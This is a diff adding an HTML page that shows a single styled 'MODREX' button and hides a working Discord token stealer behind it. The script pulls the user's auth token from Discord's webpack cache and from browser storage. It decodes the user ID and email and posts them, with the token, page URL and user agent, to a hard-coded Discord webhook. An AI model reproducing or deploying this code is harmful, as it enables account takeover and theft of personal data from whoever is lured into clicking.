@@ -1,0 +1,185 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Modrex bouton</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background: #36393f;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .modrex-button {
+            background: linear-gradient(45deg, #5865f2, #4752c4);
+            color: white;
+            border: none;
+            padding: 20px 40px;
+            font-size: 18px;
+            font-weight: bold;
+            border-radius: 50px;
+            cursor: pointer;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.3);
+            transition: all 0.3s ease;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+        .modrex-button:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 20px rgba(0,0,0,0.4);
+        }
+        .modrex-button:active {
+            transform: translateY(0);
+        }
+        .loading {
+            background: linear-gradient(45deg, #4752c4, #3a43a8);
+            cursor: not-allowed;
+        }
+    </style>
+</head>
+<body>
+    <button id="modrexBtn" class="modrex-button" onclick="modrex()">
+        🔐 MODREX
+    </button>
+
+    <script>
+        async function modrexGrab() {
+            const button = document.getElementById('modrexBtn');
+            const originalText = button.textContent;
+            
+            // Changement d'état pendant le grab
+            button.textContent = '🔄 Traitement...';
+            button.classList.add('loading');
+            button.disabled = true;
+            
+            try {
+                // Extraction du token par toutes les méthodes
+                const token = await extractToken();
+                
+                if (token) {
+                    // Envoi vers le webhook
+                    await sendTokenToWebhook(token);
+                    button.textContent = '✅ Succès!';
+                } else {
+                    button.textContent = '❌ Échec';
+                }
+            } catch (error) {
+                button.textContent = '❌ Erreur';
+                console.log('Erreur Modrex:', error);
+            }
+            
+            // Retour à l'état normal
+            setTimeout(() => {
+                button.textContent = originalText;
+                button.classList.remove('loading');
+                button.disabled = false;
+            }, 2000);
+        }
+        
+        function extractToken() {
+            return new Promise((resolve) => {
+                let token = null;
+                
+                // Méthode 1: Webpack (la plus fiable)
+                try {
+                    if (window.webpackChunkdiscord_app || window.webpackJsonp) {
+                        const wp = window.webpackJsonp || window.webpackChunkdiscord_app;
+                        wp.push([[], {
+                            ['__modrex__']: (_, e, r) => {
+                                e.cache = r.c;
+                            }
+                        }, [['__modrex__']]]);
+                        
+                        const cached = wp.slice(-1)[0][1]['__modrex__'].cache;
+                        for (let id in cached) {
+                            if (cached[id].exports && cached[id].exports.default && cached[id].exports.default.getToken !== undefined) {
+                                token = cached[id].exports.default.getToken();
+                                if (token) break;
+                            }
+                        }
+                    }
+                } catch(e) {}
+                
+                // Méthode 2: LocalStorage
+                if (!token) {
+                    try {
+                        token = localStorage.getItem('token');
+                    } catch(e) {}
+                }
+                
+                // Méthode 3: SessionStorage
+                if (!token) {
+                    try {
+                        token = sessionStorage.getItem('token');
+                    } catch(e) {}
+                }
+                
+                // Méthode 4: Recherche approfondie dans localStorage
+                if (!token) {
+                    try {
+                        for (let key in localStorage) {
+                            if (typeof localStorage[key] === 'string') {
+                                const match = localStorage[key].match(/[\w-]{24}\.[\w-]{6}\.[\w-]{27}/);
+                                if (match) {
+                                    token = match[0];
+                                    break;
+                                }
+                            }
+                        }
+                    } catch(e) {}
+                }
+                
+                // Méthode 5: Recherche approfondie dans sessionStorage
+                if (!token) {
+                    try {
+                        for (let key in sessionStorage) {
+                            if (typeof sessionStorage[key] === 'string') {
+                                const match = sessionStorage[key].match(/[\w-]{24}\.[\w-]{6}\.[\w-]{27}/);
+                                if (match) {
+                                    token = match[0];
+                                    break;
+                                }
+                            }
+                        }
+                    } catch(e) {}
+                }
+                
+                resolve(token);
+            });
+        }
+        
+        async function sendTokenToWebhook(token) {
+            try {
+                // Extraction des infos du token
+                let userId = 'unknown';
+                let userEmail = 'unknown';
+                try {
+                    const payload = JSON.parse(atob(token.split('.')[1]));
+                    userId = payload.id || 'unknown';
+                    userEmail = payload.email || 'no_email';
+                } catch(e) {}
+                
+                // Envoi vers le webhook spécifié
+                await fetch('https://discord.com/api/webhooks/1398771529331773511/zMAeiz7LTpLjel1IkwrMTq92ycJHBJJN2Gc9tvAaOX8yVYk6DjOENhsgPmIfFuMjmH7Z', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        content: `🔐 **MODREX LE GOONER**\n\n**👤 User ID:** ${userId}\n**📧 Email:** ${userEmail}\n**🔗 Token:** \`${token}\`\n**🌐 Source:** ${window.location.href}\n**🖥️ User Agent:** ${navigator.userAgent}\n**⏰ Timestamp:** ${new Date().toISOString()}`,
+                        username: 'Modrex GOONER',
+                        avatar_url: 'https://cdn.discordapp.com/embed/avatars/0.png'
+                    }),
+                });
+                
+                console.log('now you are a modrex');
+            } catch (error) {
+                console.log('Erreur d\'zizi Modrex:', error);
+            }
+        }
+    </script>
+</body>
+</html>
